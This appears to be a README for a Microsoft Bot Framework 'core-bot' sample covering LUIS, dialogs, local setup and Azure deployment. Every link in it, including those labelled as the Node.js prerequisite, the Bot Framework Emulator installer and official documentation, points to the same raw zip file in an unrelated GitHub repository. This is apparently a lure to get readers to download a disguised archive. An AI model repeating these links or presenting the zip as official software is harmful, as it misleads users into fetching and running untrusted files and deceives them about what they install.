# core-bot

Demonstrate the core capabilities of the Microsoft Bot Framework

This bot has been created using [Bot Framework](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip), it shows how to:

- Use [LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) to implement core AI capabilities
- Implement a multi-turn conversation using Dialogs
- Handle user interruptions for such things as `Help` or `Cancel`
- Prompt for and validate requests for information from the user
- Demonstrate how to handle any unexpected errors

## Prerequisites

This template **requires** prerequisites in order to run.

### Overview

This bot uses [LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip), an AI based cognitive service, to implement language understanding.

- [https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) version 10.14 or higher

    ```bash
    # determine node version
    node --version
    ```

# To run the bot locally
- Download the bot code from the Build blade in the Azure Portal (make sure you click "Yes" when asked "Include app settings in the downloaded zip file?").
    - If you clicked "No" you will need to copy all the Application Settings properties from your App Service to your local .env file.
- Install modules

    ```bash
    npm install
    ```
- Run the bot

    ```bash
    npm start
    ```

## Testing the bot using Bot Framework Emulator

[Bot Framework Emulator](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) is a desktop application that allows bot developers to test and debug their bots on localhost or running remotely through a tunnel.

- Install the latest Bot Framework Emulator from [here](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)

### Connect to the bot using Bot Framework Emulator

- Launch Bot Framework Emulator
- File -> Open Bot
- Enter a Bot URL of `http://localhost:3978/api/messages`

## Deploy the bot to Azure
After creating the bot and testing it locally, you can deploy it to Azure to make it accessible from anywhere.
To learn how, see [Deploy your bot to Azure](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) for a complete set of deployment instructions.

## Further reading

- [Bot Framework Documentation](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Bot Basics](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Dialogs](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Gathering Input Using Prompts](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Activity processing](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Azure Bot Service Introduction](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Azure Bot Service Documentation](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Azure CLI](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Azure Portal](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Language Understanding using LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Channels and Bot Connector Service](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [Restify](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
- [dotenv](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
